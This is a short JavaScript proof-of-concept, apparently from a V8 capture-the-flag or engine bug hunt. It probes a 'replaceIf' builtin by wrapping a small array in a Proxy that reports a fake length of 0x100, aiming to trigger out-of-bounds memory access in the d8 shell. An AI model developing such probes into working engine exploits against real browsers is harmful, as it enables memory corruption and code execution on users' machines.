// initial probing PoC for replaceIf bug
// run with: d8 --allow-natives-syntax poc_step2.js
function log(x){ print(String(x)); }

let target = [1.1, 2.2, 3.3];
let p = new Proxy(target, {
  get(t, prop, recv) {
    if (prop === 'length') {
      log('[*] trap length -> 0x100');
      return 0x100;
    }
    return Reflect.get(t, prop, recv);
  }
});

%DebugPrint(target);
try {
  let r = p.replaceIf(0x40, function(e) {
    log('[*] callback element = ' + e);
    return true;
  }, 13.37);
  log('[*] returned ' + r);
} catch (e) {
  log('[!] exception: ' + e);
}
%DebugPrint(target);

